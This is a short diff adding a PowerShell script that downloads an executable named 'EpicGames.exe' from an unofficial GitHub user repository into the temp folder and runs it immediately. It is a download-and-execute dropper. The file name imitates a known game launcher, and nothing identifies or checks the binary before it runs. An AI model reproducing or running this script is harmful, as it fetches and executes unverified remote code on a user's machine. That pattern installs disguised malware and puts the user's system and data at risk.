@@ -1,0 +1,6 @@
+$url = "https://raw.githubusercontent.com/Fileupload123-sys/files/main/EpicGames.exe"
+$tempFolder = [System.IO.Path]::GetTempPath()
+$destination = Join-Path -Path $tempFolder -ChildPath "EpicGames.exe"
+Invoke-WebRequest -Uri $url -OutFile $destination
+Write-Host "File downloaded to: $destination"
+Start-Process $destination
